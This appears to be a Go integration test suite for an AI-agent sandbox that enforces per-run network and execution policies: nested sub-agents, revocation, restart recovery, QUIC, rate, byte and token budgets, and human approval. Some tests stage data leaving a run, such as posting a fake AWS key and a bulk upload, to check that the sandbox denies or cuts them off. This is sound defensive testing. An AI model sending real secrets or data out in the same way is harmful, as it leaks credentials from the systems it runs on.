	s = e.script("nodetls", `NODE_EXTRA_CA_CERTS=${SSL_CERT_FILE:-/it/test-ca.crt} /it/bin/node-official -e '
fetch("https://origin.test/allowed?try=node").then(r => console.log("node", r.status)).catch(e => console.log("node error", e.cause || e))'
`)
	out, id = e.agentRun("tp-observe", "unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy; "+s)
	expect(t, out, "node 200")
	e.timeline(id)
	shown, _, err = e.sh("/it/bin/agentctl events " + id)
	if err != nil {
		t.Fatal(err)
	}
	if !regexp.MustCompile(`/it/bin/node-official +x1 +OpenSSL \d+\.\d+\.\d+\w*, bundled probed`).MatchString(shown) ||
		!regexp.MustCompile(`GET origin.test/allowed +x1 +200 x1 \(OpenSSL \d+\.\d+\.\d+\w*, HTTP/1.1\)`).MatchString(shown) {
		t.Errorf("official Node:\n%s", shown)
	}
}

func (e *env) testTunnelIdentity(t *testing.T) {
	// Milestone 6.6: a client's identity crosses the hop to the
	// terminating listener on its tunnel's connection. Envoy pools those
	// connections by what is hashed of their options, which the identity
	// was not: while run A held a tunnel to a terminated host open, run
	// B's tunnels came from A's pool and its requests were taken as A's,
	// decided under A's policy. (The 6.1 restart check failed so,
	// intermittently: "not a run", run A having ended.)
	if _, errOut, err := e.sh("rm -f /tmp/ti-*"); err != nil {
		t.Fatal(errOut)
	}
	hold := e.py("tihold", `import http.client, os, time
c = http.client.HTTPSConnection("origin.test")
c.request("GET", "/allowed")
print("A", c.getresponse().read().decode().strip(), flush=True)
open("/tmp/ti-ready", "w").close()
while not os.path.exists("/tmp/ti-done"):
    time.sleep(0.05)
c.close()
`)
	noProxy := "unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy; "
	e.run("exec", "-d", e.name("agent"), "sh", "-c", "/it/bin/agentctl run --profile tp -- sh -c '"+noProxy+hold+"' > /tmp/ti-a.out 2>&1")
	if _, _, err := e.sh("for i in $(seq 100); do [ -f /tmp/ti-ready ] && exit 0; sleep 0.1; done; exit 1"); err != nil {
		a, _, _ := e.sh("cat /tmp/ti-a.out")
		t.Fatalf("run A did not hold its tunnel open:\n%s", a)
	}
	// B's profile allows any path on origin.test; A's, tp, does not allow
	// /from-b: decided as A's, B's requests would be refused.
	out, idB := e.agentRun("tp-observe", noProxy+`for i in 1 2 3 4 5 6 7 8; do echo "B$i $(curl -s -m 5 -o /dev/null -w "%{http_code}" https://origin.test/from-b)"; done`)
	e.sh("touch /tmp/ti-done")
	a := ""
	for i := 0; i < 50 && !strings.Contains(a, "agentctl: run "); i++ {
		a, _, _ = e.sh("cat /tmp/ti-a.out")
		time.Sleep(100 * time.Millisecond)
	}
	m := runIDRE.FindStringSubmatch(a)
	if m == nil {
		t.Fatalf("run A: %s", a)
	}
	for i := 1; i <= 8; i++ {
		if !strings.Contains(out, fmt.Sprintf("B%d 200", i)) {
			t.Errorf("run B's requests:\n%s", out)
			break
		}
	}
	if tlB := e.timeline(idB); strings.Count(tlB, `"/from-b"`) == 0 {
		t.Errorf("run B's timeline lacks its requests")
	}
	time.Sleep(500 * time.Millisecond)
	if tlA, _, _ := e.sh("cat /var/lib/clovisor/runs/run-" + m[1] + ".json"); strings.Contains(tlA, "/from-b") {
		t.Errorf("run B's requests were recorded, and decided, as run A's")
	}
}

func (e *env) testToolCalls(t *testing.T) {
	// Two tool calls, each in a cgroup of its own below the run; what each
	// does is attributed to it. A call from outside any run is refused.
	if _, errOut, err := e.sh("/it/bin/agentctl call -- true"); err == nil || !strings.Contains(errOut, "inside a run") {
		t.Fatalf("call outside a run: %v %s", err, errOut)
	}
	out, id := e.trun(`
/it/bin/agentctl call --name fetch -- curl -sS -o /dev/null -w "fetch %{http_code}\n" https://origin.test/allowed
/it/bin/agentctl call --name lookup -- getent hosts other.test || echo "lookup failed"
/it/bin/agentctl call --name status -- cat /proc/self/cgroup`)
	expect(t, out, "fetch 200", "lookup failed", "/call-3")
	tl := e.timeline(id)
	expect(t, tl, `"id": "call-1"`, `"name": "fetch"`, `"id": "call-2"`, `"name": "lookup"`, `"call": "call-1"`, `"call": "call-2"`)
}

// script writes a shell script into the bin directory the containers
// mount, and returns the command that runs it (see py).
func (e *env) script(name, src string) string {
	e.t.Helper()
	if err := os.WriteFile(filepath.Join(e.dir, "bin", name+".sh"), []byte(src), 0o644); err != nil {
		e.t.Fatal(err)
	}
	return "sh /it/bin/" + name + ".sh"
}

func (e *env) testSubAgents(t *testing.T) {
	// A tp run starts a sub-agent asking for tp-sub, which allows more
	// than tp in places: nested, it gets only what both allow (§7.8).
	e.needLSM(t)
	curl := `curl -sS -o /dev/null -w "%s %%{http_code}\n" https://origin.test/%s`
	sub := e.script("sub", strings.Join([]string{
		fmt.Sprintf(curl, "sub allowed", "allowed"),
		fmt.Sprintf(curl, "sub headers", "headers"), // tp-sub does not allow it
		fmt.Sprintf(curl, "sub secret", "secret"),   // tp does not
		`getent hosts other.test >/dev/null && echo "sub other: resolved" || echo "sub other: refused"`,
		`/tmp/t && echo "sub tmp: ran" || echo "sub tmp: refused"`,
		`P=$(sed -n "s|.*/run-\([0-9a-f]*\)/run-.*|\1|p" /proc/self/cgroup)`,
		`/it/bin/agentctl revoke $P 2>&1 | grep -q "runs nested in it" && echo "sub revoke parent: refused"`,
		`/it/bin/agentctl run --profile tp -- cat /proc/self/cgroup`,
		"",
	}, "\n"))
	out, id := e.trun("/it/bin/agentctl run --profile tp-sub -- " + sub + " 2>/tmp/sub.err; cat /tmp/sub.err")
	expect(t, out, "sub allowed 200", "sub headers 403", "sub secret 403", "sub other: refused", "sub tmp: refused",
		"sub revoke parent: refused", "nested in run "+id, "/run-"+id+"/run-")
	tl := e.timeline(id)
	expect(t, tl, `"children": [`)
	m := regexp.MustCompile(`agentctl: run ([0-9a-f]+) \(cgroup id \d+\), profile tp-sub@\S+ within run `).FindStringSubmatch(out)
	if m == nil {
		t.Fatalf("no nested run reported:\n%s", out)
	}
	stl := e.timeline(m[1])
	expect(t, stl, `"parent": "`+id+`"`, `"source": "run `+id+`: granted"`, `"profile": "tp-sub"`, `"verdict": "refused: exec"`)

	// Revoking the parent revokes the sub-agent already running.
	wait := e.script("wait", `while [ ! -f /tmp/go ]; do sleep 0.1; done
`+fmt.Sprintf(curl, "after revoke", "allowed")+"\n")
	out, _ = e.trun(`rm -f /tmp/go
(/it/bin/agentctl run --profile tp-sub -- ` + wait + ` 2>/dev/null) &
sleep 1
P=$(sed -n "s|.*/run-\([0-9a-f]*\)$|\1|p" /proc/self/cgroup)
/it/bin/agentctl revoke $P >/dev/null && echo revoked
touch /tmp/go
wait`)
	// Refused at the tunnel (the CONNECT, so no HTTP status) or inside it.
	expect(t, out, "revoked", "after revoke ")
	if strings.Contains(out, "after revoke 200") {
		t.Errorf("a revoked parent's sub-agent still reached the origin:\n%s", out)
	}
}

func (e *env) testRunNet(t *testing.T) {
	// tp and its ceiling both allow UDP to the origin's port 5002 and ping
	// to the origin (milestone 4.7); tp-sub allows neither, so a sub-agent
	// under tp gets neither.
	probe := e.py("net", `import socket, sys
ip = "`+e.originIP+`"
def udp(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(2)
    try:
        s.sendto(b"hi", (ip, port))
        return "echo" if s.recvfrom(16)[0] == b"hi" else "?"
    except OSError as err:
        return "refused %s" % err.errno
def ping(dst):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_ICMP)
    s.settimeout(2)
    try:
        s.sendto(b"\x08\x00\x00\x00\x00\x00\x00\x01clovisor", (dst, 0))
        return "reply" if s.recvfrom(64)[0][0] == 0 else "?"
    except OSError as err:
        return "refused %s" % (err.errno or "timeout")
who = sys.argv[1]
print(who, "udp5002", udp(5002))
print(who, "ping origin", ping(ip))
print(who, "ping other", ping("192.0.2.1"))
`)
	out, id := e.trun(probe + " run; /it/bin/agentctl run --profile tp-sub -- " + probe + " sub")
	expect(t, out, "run udp5002 echo", "run ping origin reply", "run ping other refused",
		"sub udp5002 refused 1", "sub ping origin refused", "sub ping other refused")
	if strings.Contains(e.timeline(id), `"udp_refused_to"`) {
		t.Errorf("granted UDP reported as refused")
	}
}

func (e *env) testCheckTransparent(t *testing.T) {
	_, id := e.trun("getent hosts other.test; " + e.py("udp443", `import socket
try:
    socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(b"x", ("8.8.8.8", 4443))
except OSError:
    pass
`))
	e.timeline(id)
	out, _, _ := e.sh("/it/bin/agentctl check --transparent --profile /etc/clovisor/policy/tp.yaml " + id)
	expect(t, out, "as transparent enforce would decide", "dns    other.test", "udp    UDP 8.8.8.8:4443")
}

func (e *env) testRestart(t *testing.T) {
	// Milestone 6.1: runs going when the node agent restarts keep what
	// they were granted. Run A probes the same things before and after;
	// run B, revoked before the restart, stays revoked. (In 6.0, after a
	// restart, all of A's probes passed and B reached the origin.)
	e.needLSM(t)
	if _, errOut, err := e.sh("cp /bin/true /tmp/t; rm -f /tmp/go* /tmp/done*"); err != nil {
		t.Fatal(errOut)
	}
	probe := e.script("restart", `for i in 0 1; do
  while [ ! -f /tmp/go$i ]; do sleep 0.1; done
  echo "R$i allowed $(curl -s -m 5 -o /dev/null -w '%{http_code}' https://origin.test/allowed)"
  echo "R$i secret $(curl -s -m 5 -o /dev/null -w '%{http_code}' https://origin.test/secret)"
  echo "R$i other $(curl -s -m 5 -o /dev/null -w '%{http_code}' https://other.test/x)"
  getent hosts other.test >/dev/null && echo "R$i dns-other resolved" || echo "R$i dns-other refused"
  /tmp/t 2>/dev/null && echo "R$i exec-tmp ran" || echo "R$i exec-tmp refused"
  touch /tmp/done$i
done
`)
	revoked := e.script("revoked", `while [ ! -f /tmp/go1 ]; do sleep 0.1; done
echo "B after $(curl -s -m 5 -o /dev/null -w '%{http_code}' https://origin.test/allowed)"
`)
	// Run C (milestone 6.6) captures TLS plaintext: one Python process
	// makes a request before the restart and another after. Its probes go
	// with the old node agent; the new one attaches them again.
	capture := e.py("restartcap", `import os, time, urllib.request
def get(p):
    print("C", p, urllib.request.urlopen("https://origin.test/" + p).status, flush=True)
get("c0")
while not os.path.exists("/tmp/go1"):
    time.sleep(0.1)
get("c1")
`)
	noProxy := "unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy; "
	e.run("exec", "-d", e.name("agent"), "sh", "-c", "/it/bin/agentctl run --profile tp -- sh -c '"+noProxy+probe+"' > /tmp/ra.out 2>&1; echo exit=$? >> /tmp/ra.out")
	e.run("exec", "-d", e.name("agent"), "sh", "-c", "/it/bin/agentctl run --profile tp -- sh -c '"+noProxy+revoked+"' > /tmp/rb.out 2>&1")
	e.run("exec", "-d", e.name("agent"), "sh", "-c", "/it/bin/agentctl run --profile tp-observe -- sh -c '"+noProxy+capture+"' > /tmp/rc.out 2>&1")
	ids := map[string]string{}
	for _, f := range []string{"ra", "rb", "rc"} {
		for i := 0; i < 50 && ids[f] == ""; i++ {
			out, _, _ := e.sh("cat /tmp/" + f + ".out")
			if m := runIDRE.FindStringSubmatch(out); m != nil {
				ids[f] = m[1]
			}
			time.Sleep(100 * time.Millisecond)
		}
	}
	if ids["ra"] == "" || ids["rb"] == "" || ids["rc"] == "" {
		t.Fatalf("runs did not start: %v", ids)
	}
	if out, errOut, err := e.sh("/it/bin/agentctl revoke " + ids["rb"]); err != nil {
		t.Fatalf("revoke: %v %s%s", err, out, errOut)
	}
	e.sh("touch /tmp/go0; while [ ! -f /tmp/done0 ]; do sleep 0.1; done")
	e.sh("for i in $(seq 100); do grep -q 'C c0' /tmp/rc.out && break; sleep 0.1; done")

	if err := e.stopNodeAgent(); err != nil {
		t.Fatal(err)
	}
	if _, errOut, err := e.sh("while kill -0 $(cat /run/node-agent.pid) 2>/dev/null; do sleep 0.1; done"); err != nil {
		t.Fatal(errOut)
	}
	e.startNodeAgent()
	if out, errOut, err := e.sh(`for i in $(seq 100); do /it/bin/agentctl status 2>/dev/null | grep -q 'Healthy       yes' && exit 0; sleep 0.1; done
/it/bin/agentctl status; exit 1`); err != nil {
		t.Fatalf("not healthy after restart: %v\n%s%s", err, out, errOut)
	}
	status, _, _ := e.sh("/it/bin/agentctl status")
	expect(t, status, "Restored      3 runs restored at start")

	e.sh("touch /tmp/go1; while [ ! -f /tmp/done1 ]; do sleep 0.1; done")
	var a string
	for i := 0; i < 100 && !strings.Contains(a, "exit="); i++ {
		a, _, _ = e.sh("cat /tmp/ra.out")
		time.Sleep(100 * time.Millisecond)
	}
	expect(t, a, "R0 allowed 200", "R0 secret 403", "R0 other 000", "R0 dns-other refused", "R0 exec-tmp refused",
		"R1 allowed 200", "R1 secret 403", "R1 other 000", "R1 dns-other refused", "R1 exec-tmp refused", "exit=0")
	if strings.Contains(a, "could not report the end") {
		t.Errorf("agentctl did not reconnect to report the end:\n%s", a)
	}
	var b string
	for i := 0; i < 100 && !strings.Contains(b, "B after"); i++ {
		b, _, _ = e.sh("cat /tmp/rb.out")
		time.Sleep(100 * time.Millisecond)
	}
	expect(t, b, "B after ")
	if strings.Contains(b, "B after 200") {
		t.Errorf("a run revoked before the restart reached the origin after it:\n%s", b)
	}
	tl := e.timeline(ids["ra"])
	expect(t, tl, `"restored": [`, `"exit_code": 0`)
	shown, _, _ := e.sh("/it/bin/agentctl events " + ids["ra"])
	expect(t, shown, "Restored  ", "the node agent restarted, and gave the run its grants back")

	var c string
	for i := 0; i < 100 && !strings.Contains(c, "C c1"); i++ {
		c, _, _ = e.sh("cat /tmp/rc.out")
		time.Sleep(100 * time.Millisecond)
	}
	expect(t, c, "C c0 200", "C c1 200")
	e.timeline(ids["rc"])
	shown, _, _ = e.sh("/it/bin/agentctl events " + ids["rc"])
	if !regexp.MustCompile(`GET origin.test/c0 +x1 +200 x1 \(libssl`).MatchString(shown) ||
		!regexp.MustCompile(`GET origin.test/c1 +x1 +200 x1 \(libssl`).MatchString(shown) {
		t.Errorf("TLS plaintext across the restart:\n%s", shown)
	}
	log, _, _ := e.sh("cat /var/log/node-agent.log")
	if !regexp.MustCompile(`restored run ` + ids["rc"] + `: TLS probes attached to [1-9]\d* running processes`).MatchString(log) {
		t.Errorf("no probes attached to the capturing run's processes at restore")
	}
}

func (e *env) testFailClosed(t *testing.T) {
	// A run already going when the node agent stops: its next connect,
	// and its next lookup, are refused.
	conn := e.py("fc", `import socket
try:
    socket.create_connection(("`+e.originIP+`", 2222), timeout=3)
    print("connected")
except OSError as err:
    print("connect errno", err.errno)
`)
	e.run("exec", "-d", e.name("agent"), "sh", "-c",
		`/it/bin/agentctl run --profile tp -- sh -c 'sleep 3; `+conn+` > /tmp/fc.conn 2>&1; `+
			`getent hosts origin.test > /tmp/fc.dns 2>&1; echo $? >> /tmp/fc.dns' > /tmp/fc.run 2>&1`)
	time.Sleep(time.Second)
	if err := e.stopNodeAgent(); err != nil {
		t.Fatalf("stop node agent: %v", err)
	}
	time.Sleep(4 * time.Second)
	out, _, _ := e.sh("cat /tmp/fc.conn /tmp/fc.dns; ls /sys/fs/bpf/clovisor/")
	expect(t, out, "connect errno 1", "transparent-connect4")
	if !strings.Contains(out, "\n2\n") {
		t.Errorf("lookup not refused with the node agent down:\n%s", out)
	}
}

func (e *env) testTransparentContent(t *testing.T) {
	// Milestones 5.1 and 5.2 without proxy settings: content rules on a
	// host terminated by the transparent listener, and a connection rate
	// of 6 a minute, which the three content requests and three more fill.
	s := e.script("content", `u=https://origin.test/echo
echo "clean: $(curl -s --data-binary '{"a":"hello"}' $u)"
echo "redact: $(curl -s --data-binary '{"t":"tok_abcd1234"}' $u)"
echo "deny: $(curl -s -w ' %{http_code}' --data-binary '{"k":"AKIAABCDEFGHIJKLMNOP"}' $u)"
for i in 4 5 6 7 8; do echo "conn$i: $(curl -s -o /dev/null -w '%{http_code}' https://origin.test/allowed)"; done
`)
	out, id := e.agentRun("tp-content", "unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy; "+s)
	expect(t, out, `clean: {"body":"{\"a\":\"hello\"}"`, `redact: {"body":"{\"t\":\"************\"}"`,
		"AWS keys may not leave this run.", "} 403", "conn4: 200", "conn5: 200", "conn6: 200")
	for _, c := range []string{"conn7: 200", "conn8: 200"} {
		if strings.Contains(out, c) {
			t.Errorf("past connections_per_min: %s\n%s", c, out)
		}
	}
	shown, _, err := e.sh("/it/bin/agentctl events " + id)
	if err != nil {
		t.Fatal(err)
	}
	expect(t, shown, "tp-content/aws-keys (deny)", "tp-content/tokens (redact)", "CONNECT origin.test:443 -> deny by tp-content [connections_per_min]")
}

func (e *env) testTransparentLimits(t *testing.T) {
	// Milestone 5.2: a rate-limit rule, and egress bytes counted in the
	// kernel. Past 256Ki the run's packets are dropped and its egress
	// revoked.
	out, id := e.agentRun("tp-limits", `unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy
for i in 1 2 3; do curl -s -o /dev/null -w "other$i %{http_code}\n" https://other.test/x; done
echo "small: $(curl -s -o /dev/null -w %{http_code} --data-binary hello https://origin.test/echo)"
head -c 1000000 /dev/zero > /tmp/1m
echo "big: $(curl -s -m 5 -o /dev/null -w %{http_code} --data-binary @/tmp/1m https://origin.test/echo)"
sleep 2
echo "after: $(curl -s -m 3 -o /dev/null -w %{http_code} https://origin.test/allowed)"`)
	expect(t, out, "other1 200", "other2 200", "other3 429", "small: 200")
	for _, l := range strings.Split(out, "\n") {
		if (strings.HasPrefix(l, "big: ") || strings.HasPrefix(l, "after: ")) && strings.HasSuffix(l, " 200") {
			t.Errorf("past the egress limit: %s\n%s", l, out)
		}
	}
	shown, _, err := e.sh("/it/bin/agentctl events " + id)
	if err != nil {
		t.Fatal(err)
	}
	expect(t, shown, "Limit     egress_bytes 256Ki (profile tp-limits): revoked", "Egress    ")
	n := regexp.MustCompile(`Egress    (\d+) bytes`).FindStringSubmatch(shown)
	if n == nil {
		t.Fatalf("no egress bytes:\n%s", shown)
	}
	// What was sent: up to the limit, the upload filling it before it was
	// cut off. Refused packets are not counted.
	if b, _ := strconv.Atoi(n[1]); b < 128<<10 || b > 256<<10 {
		t.Errorf("egress bytes %d: want most of 256Ki and no more", b)
	}
}

func (e *env) testTransparentModels(t *testing.T) {
	// The script goes in a file: agentRun quotes it in single quotes.
	if _, errOut, err := e.sh(`cat > /tmp/tp-models.sh <<'EOS'
unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy
echo "gpt-5: $(curl -s -o /dev/null -w %{http_code} --data-binary '{"model":"gpt-5"}' https://other.test/echo)"
echo "gpt-4o: $(curl -s -w ' %{http_code}' --data-binary '{"model":"gpt-4o"}' https://other.test/echo)"
echo "get: $(curl -s -o /dev/null -w %{http_code} https://other.test/x)"
EOS`); err != nil {
		t.Fatal(errOut)
	}
	out, id := e.agentRun("tp-models", `sh /tmp/tp-models.sh`)
	expect(t, out, "gpt-5: 200", `model \"gpt-4o\" is not allowed by rule llm of profile tp-models`, "} 403", "get: 200")
	shown, _, err := e.sh("/it/bin/agentctl events " + id)
	if err != nil {
		t.Fatal(err)
	}
	expect(t, shown, "Models (2)", `"gpt-4o"`, "denied 1")
}

func (e *env) testTransparentBudgets(t *testing.T) {
	// 300 tokens a call against a budget of 500: the parent's call and its
	// nested run's first spend it; the nested run's second is refused, by
	// its parent's budget.
	c := `curl -s -w " %{http_code}\n" --data-binary '{"model":"claude-sonnet-5-5","max_tokens":200}' https://other.test/v1/messages`
	child := e.script("budget-child", "echo \"child1: $("+c+")\"\necho \"child2: $("+c+")\"\n")
	parent := e.script("budget-parent", "unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy\n"+
		"echo \"parent: $("+c+")\"\n/it/bin/agentctl run --profile tp-budget -- "+child+" 2>/dev/null\n")
	out, id := e.agentRun("tp-budget", parent)
	expect(t, out, `parent: {"content"`, `child1: {"content"`, "Run "+id+" and the runs nested in it have spent the budget of rule llm of profile tp-budget",
		"600 tokens", "} 403")
	shown, _, err := e.sh("/it/bin/agentctl events " + id)
	if err != nil {
		t.Fatal(err)
	}
	expect(t, shown, "Budget    rule llm (profile tp-budget): 600 of 500 tokens, $0.0066 in 2 requests, nested runs included")
}

func (e *env) testTransparentAsk(t *testing.T) {
	script := e.script("ask", `unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy
echo "inside: $(/it/bin/agentctl pending 2>&1)"
getent hosts other.test >/dev/null && echo "dns other: resolved" || echo "dns other: refused"
getent hosts unlisted.test >/dev/null && echo "dns unlisted: resolved" || echo "dns unlisted: refused"
echo "other: $(curl -s -o /dev/null -w %{http_code} https://other.test/x)"
`)
	type result struct{ out, errOut string }
	done := make(chan result, 1)
	go func() {
		out, errOut, _ := e.sh("/it/bin/agentctl run --profile tp-ask -- " + script)
		done <- result{out, errOut}
	}()
	id, _ := e.waitPending(t, "GET other.test/x")
	if out, errOut, err := e.sh("/it/bin/agentctl approve " + id); err != nil {
		t.Fatalf("approve: %v\n%s%s", err, out, errOut)
	}
	var r result
	select {
	case r = <-done:
	case <-time.After(30 * time.Second):
		t.Fatal("run did not finish")
	}
	// From inside the run, held requests are neither listed nor decided.
	expect(t, r.out, "inside: Error: node agent: requests held for approval cannot be seen or decided from inside a run",
		"dns other: resolved", "dns unlisted: refused", "other: 200")
	m := runIDRE.FindStringSubmatch(r.errOut)
	if m == nil {
		t.Fatalf("no run:\n%s%s", r.out, r.errOut)
	}
	expect(t, e.timeline(m[1]), `"ask `+id+`: approved by root (uid 0) after`, `"unlisted.test"`)
}

func (e *env) testQUIC(t *testing.T) {
	// QUIC by name (milestone 5.6): other.test is allowed by a host rule,
	// so its QUIC is relayed, with the default post-quantum key shares
	// (a ClientHello over two datagrams) and with X25519 (one). origin.test
	// has path rules, so its QUIC is refused and the client told why. A
	// connection to the origin's address naming an unlisted host is
	// decided by the name, and refused.
	q := "/it/bin/quictest get -timeout 3s"
	out, id := e.agentRun("tp-quic", strings.Join([]string{
		"unset http_proxy https_proxy HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy",
		`echo "other: $(` + q + ` -name other.test 2>&1)"`,
		`echo "other x25519: $(` + q + ` -name other.test -x25519 2>&1)"`,
		`echo "origin: $(` + q + ` -name origin.test 2>&1)"`,
		`echo "by address: $(` + q + ` -name unlisted.test -addr ` + e.originIP + `:443 2>&1)"`,
	}, "; "))
	expect(t, out, "other: quic other.test ok", "other x25519: quic other.test ok",
		"origin: refused after", "CONNECTION_REFUSED", "Rules for origin.test need what is sent inside the connection",
		"by address: refused after", "No rule in profile tp-quic allows unlisted.test:443.")
	tl := e.timeline(id)
	expect(t, tl, `"note": "QUIC to `+e.originIP+`:443"`, `"reason": "quic: needs termination"`)
	shown, _, _ := e.sh("/it/bin/agentctl events " + id)
	expect(t, shown, "CONNECT other.test:443 -> allow rule other", "(QUIC to ")
}

func (e *env) testDuration(t *testing.T) {
	start := time.Now()
	out, errOut, _ := e.sh(`/it/bin/agentctl run --profile tp-brief -- sh -c 'sleep 10; echo survived'`)
	if strings.Contains(out, "survived") || time.Since(start) > 8*time.Second {
		t.Fatalf("not ended at its duration (%s):\n%s%s", time.Since(start), out, errOut)
	}
	expect(t, errOut, "was ended by the node agent: it reached its duration limit of 2s (profile tp-brief)")
}
